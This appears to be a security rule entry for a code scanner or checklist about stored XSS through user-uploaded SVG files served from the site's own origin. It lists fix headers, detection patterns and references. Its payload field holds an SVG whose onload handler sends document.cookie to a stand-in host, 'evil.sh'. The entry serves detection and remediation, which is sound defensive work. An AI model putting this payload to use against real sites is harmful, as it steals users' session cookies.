---
cwe: 79
owasp: A05
title: Uploaded SVG served from your origin
category: content
severity: high
sink: |-
    <a href="/uploads/avatar.svg">View full size</a>
payload: |-
    <svg xmlns="http://www.w3.org/2000/svg" onload="fetch('//evil.sh?c='+document.cookie)"/>
fix: |
    Content-Security-Policy: sandbox
    Content-Disposition: attachment
detect:
    - '\.svg["'']'
    - 'image/svg\+xml'
    - "multer|formidable|busboy"
verify: "Upload the payload as an image, then open its URL directly."
fineWhen: "Uploads are served from a separate, cookieless domain, or converted to a raster format on upload."
refs:
    - https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html
    - https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Content-Security-Policy/sandbox
---

In an `<img>` my SVG is harmless. Opened as a page on your domain, its script runs with your cookies. Serve uploads from another domain, or with headers that stop them running as pages.
